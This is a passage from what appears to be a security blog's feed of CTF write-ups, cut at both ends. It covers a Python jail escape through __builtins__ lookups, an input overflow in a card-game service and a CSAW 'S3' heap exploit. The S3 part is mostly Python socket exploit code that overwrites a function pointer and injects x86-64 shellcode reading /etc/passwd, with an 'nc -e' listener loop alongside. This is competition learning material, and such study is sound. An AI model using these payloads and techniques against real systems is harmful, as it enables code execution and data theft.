class="p">,</span> <span class="s">&#39;AssertionError&#39;</span><span class="p">,</span> <span class="s">&#39;classmethod&#39;</span><span class="p">,</span> <span class="s">&#39;UnboundLocalError&#39;</span><span class="p">,</span> <span class="s">&#39;NotImplementedError&#39;</span><span class="p">,</span> <span class="s">&#39;AttributeError&#39;</span><span class="p">,</span> <span class="s">&#39;OverflowError&#39;</span><span class="p">]</span></code></pre></div>


<p>On my system, the 80th value is &lsquo;open&rsquo;, but on the remote server, it&rsquo;s the 78th. Difference in Python version? Anyway, we can now call the fuction &lsquo;open&rsquo; like so and avoid the filter by using string concatenation:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()[</span><span class="mi">78</span><span class="p">]](</span><span class="s">&#39;/home/pybaby/fl&#39;</span><span class="o">+</span><span class="s">&#39;ag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span></code></pre></div>


<h1>pwn300</h1>

<p>By far the easiest 300 point challenge. Again, we&rsquo;re given an ip address. Upon connecting I did what I always do:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>nc 54.69.118.120 7000
Welcome to Google Gamble.
<span class="o">=========================</span>

Google Gamble is easy. Guess the card drawn
from the deck and double your money! Make it all
the way to <span class="nv">$1048576</span> to get a flag! Good luck!

Your current balance: 1<span class="err">$</span>

Select an option:
1. Guess a card
2. Get the flag
3. Quit
1
Please enter your guess: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
The computer picked AAAAAAAAAAAA        <span class="o">(</span>Valet!<span class="o">)</span>
Congrats, you won this round!
Your current balance: 2<span class="err">$</span>

Select an option:
1. Guess a card
2. Get the flag
3. Quit
Please enter your guess: The computer picked AAAAAAAAAAAA
Congrats, you won this round!
Your current balance: 4<span class="err">$</span>

Select an option:
1. Guess a card
2. Get the flag
3. Quit
Please enter your guess: The computer picked AAAAAA

Congrats, you won this round!
Your current balance: 8<span class="err">$</span></code></pre></div>


<p>I have the sick tendency to either supply SQL injections or large repeats of &lsquo;A&rsquo;. Apparently, this program checks the guess of the user versus some precomputed value. However, the large input overwrites this precomputed value. The check will always be true and the money doubles. I just rinsed &amp; repeated until I had enough to extract the flag:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">Select an option:
1. Guess a card
2. Get the flag
3. Quit
Please enter your guess: The computer picked AAAAAA

Congrats, you won this round!
Your current balance: 16777216<span class="err">$</span>

Select an option:
1. Guess a card
2. Get the flag
3. Quit
2
Here is your well-deserved prize: flag<span class="o">{</span>valet_knekt_jack_jumbo<span class="o">}</span>
Congratulations!
Good bye!</code></pre></div>


<p><code>flag{valet_knekt_jack_jumbo}</code></p>

<p>And that was it! I hope there&rsquo;s more of this <code>tinyctf</code> to come!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW CTF Exploit 300: S3]]></title>
    <link href="http://barrebas.github.io/blog/2014/09/25/CSAW-s3/"/>
    <updated>2014-09-25T19:25:41+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/09/25/CSAW-s3</id>
    <content type="html"><![CDATA[<p>A while ago, we threw together a semi-official <a href="https://ctf-team.vulnhub.com">VulnHub CTF team</a>. This team participated in the CSAW CTF. For me, it was a new and <em>humbling</em> experience. I didn&rsquo;t get a lot of flags but I managed to get this one.</p>

<!--more-->


<p>Upon downloading the binary called <code>s3</code>, I connected to the remote server to quickly see what I was up against.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>nc 54.165.225.121 5333</code></pre></div>


<p>However, the connection timed out very quickly. I checked out the local copy with file:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file s3
s3: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped</code></pre></div>


<p>Interesting, a 64 bit binary. Viewing it in <code>hopper</code> suggested that it is a C++ binary. I started the binary locally and faced the same quick time-out. This didn&rsquo;t sit well with me, because I could hardly enter the second command to play around.</p>

<p>I fired up <code>gdb-peda</code> and ran the binary. It quickly showed the problem:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>r
warning: Could not load shared library symbols <span class="k">for</span> linux-vdso.so.1.
Do you need <span class="s2">&quot;set solib-search-path&quot;</span> or <span class="s2">&quot;set sysroot&quot;</span>?
Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>

    c &lt;<span class="nb">type</span>&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;<span class="nb">type</span>&gt;
                        Types are:
                            <span class="m">0</span> - NULL-Terminated String
                            <span class="m">1</span> - Counted String
    r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
    u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
    d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
    x                 - Exit Amazon S3

&gt; 
Program received signal SIGALRM, Alarm clock.</code></pre></div>


<p><img src="http://barrebas.github.io/assets/s3-gdb-alarm.png" alt="s3: gdb caught the alarm." /></p>

<p>Turns out this SIGALRM is generated by a call to <a href="http://linux.die.net/man/2/alarm">alarm()</a>. In hindsight, I could have made a library that overrides the call to <code>alarm()</code>, but I went with the hex-editing approach. I disassembled the binary using <code>objdump</code> and used <code>grep</code> to search the output for &ldquo;alarm&rdquo;:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>objdump -d s3 <span class="p">|</span> grep alarm
<span class="m">0000000000401300</span> &lt;alarm@plt&gt;:
  402126:   e8 d5 f1 ff ff          callq  <span class="m">401300</span> &lt;alarm@plt&gt;
  403771:   e8 8a db ff ff          callq  <span class="m">401300</span> &lt;alarm@plt&gt;</code></pre></div>


<p>Using <code>xxd</code>, <code>objdump</code> and <code>sed</code>, I replaced those bytes with NOPs and reversed the process with <code>xxd -r</code>, generating a new binary in the process that was devoid of annoying timeouts!</p>

<p>The binary allows the storage of two types of strings: NULL-terminated and so-called &ldquo;counted&rdquo; strings. I assume these are like the strings used in Pascal, where the length of the string is prepended to the string. I created a NULL-terminated string and the binary gave me an identifier. I updated the string and was given another, very similar identifier. I read the string, deleted it and tried to read it again. The program happily told me there was no such string identifier and called it a day. I did notice that the string identifiers are in fact hex-addresses and examining these locations in gdb confirmed it.</p>

<p><img src="http://barrebas.github.io/assets/s3-NULL-string.png" alt="s3: NULL-terminated strings, no problems!" /></p>

<p>Next, the obvious target was the &ldquo;counted&rdquo; string. I created a string &ldquo;bleh&rdquo;, updated it to &ldquo;blehbleh&rdquo; and tried to read from it&hellip; segfault! Awesome, we have a lead.</p>

<p><img src="http://barrebas.github.io/assets/s3-countedstring-segfault.png" alt="s3: counted strings... Oops!" /></p>

<p>Time to fire up <code>gdb</code> again and try to reproduce the crash:</p>

<p><img src="http://barrebas.github.io/assets/s3-reproduced-crash.png" alt="s3: success! Let's see what's going on." /></p>

<p>It looks like the updated string somehow overwrites a function pointer. This pointer is used here:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">=</span>&gt; 0x4019d6: call   QWORD PTR <span class="o">[</span>rax+0x10<span class="o">]</span></code></pre></div>


<p>Obviously, <code>0x42424242-0x10</code> holds nothing interesting. However, we have overwritten a function pointer with a value that we control so in principle, we can hijack <code>EIP</code> and execute arbitrary code! The drawback is that the pointer is derefenced, so in order to execute any shellcode, we need to do the following:</p>

<p><img src="http://barrebas.github.io/assets/strings.png" alt="s3: exploitation flow" /></p>

<p>We store shellcode somewhere, we store a pointer to the shellcode and finally, we overwrite the function pointer with a pointer to the pointer to the shellcode&hellip; confusing, eh? I went bit by bit, using the string storing service to store stuff. The string identifiers turned out to be memory addresses:</p>

<p><img src="http://barrebas.github.io/assets/s3-gdb-id-is-address.png" alt="s3: memory addresses as string identifiers" /></p>

<p>I got tired of copying and pasting the string identifiers so I switched over to python. In order to emulate the server, I put the binary behind a nc listener:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> nc -e ./s3 -v -l -p 5333<span class="p">;</span> <span class="k">done</span></code></pre></div>


<p>Notice that I&rsquo;m using <code>s3</code> again, as this will automagically restart without the need for a clean shutdown (in case the script needs debugging). I enabled coredumps with <code>ulimit -c unlimited</code> and started scripting and debugging, a lot.</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>


<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span><span class="o">&lt;</span>  
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>

<span class="c"># banner</span>
<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="c"># send first string. this will be our shellcode</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 CTF!</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] first location = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>

<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
<span class="c"># let&#39;s crash the binary to see if this works</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; AAAA</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] second location = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>

<span class="c"># send read request to crash binary</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>

<span class="c"># terminate connection cleanly</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>After running this (and careful debugging of the script) I got a coredump:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python ./amaz.py 
Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>

    c &lt;<span class="nb">type</span>&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;<span class="nb">type</span>&gt;
                        Types are:
                            <span class="m">0</span> - NULL-Terminated String
                            <span class="m">1</span> - Counted String
    r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
    u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
    d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
    x                 - Exit Amazon S3


<span class="o">[</span>+<span class="o">]</span> first <span class="nv">location</span> <span class="o">=</span> 0x00b10030
<span class="o">[</span>+<span class="o">]</span> second <span class="nv">location</span> <span class="o">=</span> 0x00b10050
bas@tritonal:~/documents/s3 writeup<span class="nv">$ </span>gdb ./s3 core
...snip...
gdb-peda<span class="nv">$ </span>i r
rax            0x41414141   0x41414141</code></pre></div>


<p>Good, we have control over <code>rax</code>. Now let&rsquo;s use this to dereference the pointer to the first string:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&gt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span></code></pre></div>


<p>Which obviously still crashes, because now the binary executes:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#0  0x0000000021465443 in ?? ()</span></code></pre></div>


<p>Which obviously contains no data, nor any code. But let&rsquo;s give it a proper pointer, shall we? And while I&rsquo;m at it, I&rsquo;ll set the shellcode to <code>INT3</code>. The stack is executable, so this should work!</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>


<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>

<span class="c"># banner</span>
<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="c"># send first string. this will be our shellcode</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 </span><span class="se">\xCC\xCC\xCC\xCC\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] shellcode = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>


<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] pivot = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>

<span class="c"># let&#39;s crash the binary to see if this works</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] vulnerable pointer = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span>

<span class="c"># send read request to crash binary</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>

<span class="c"># terminate connection cleanly</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>In the other terminal, I observed:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from localhost <span class="o">[</span>127.0.0.1<span class="o">]</span> 53500
Trace/breakpoint <span class="nb">trap</span> <span class="o">(</span>core dumped<span class="o">)</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">5333</span> ...</code></pre></div>


<p>BOOM! Code execution on my local machine!</p>

<p>At this point I wasted some time to cook up a small shellcode that would re-use existing code in the binary, to verify that the stack was indeed executable in the remote binary. It was, whoop-dee-doo! Next I searched for a proper shellcode and stumbled upon <a href="!http://shell-storm.org/shellcode/files/shellcode-878.php">this one</a>.</p>

<p>I stuck it in the exploit and lo and behold:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>


<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>

<span class="c"># banner</span>
<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="c"># send first string. this will be our shellcode</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 </span><span class="se">\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] shellcode = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>


<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] pivot = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>

<span class="c"># let&#39;s crash the binary to see if this works</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] vulnerable pointer = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span>

<span class="c"># send read request to crash binary</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
<span class="c"># terminate connection cleanly</span>
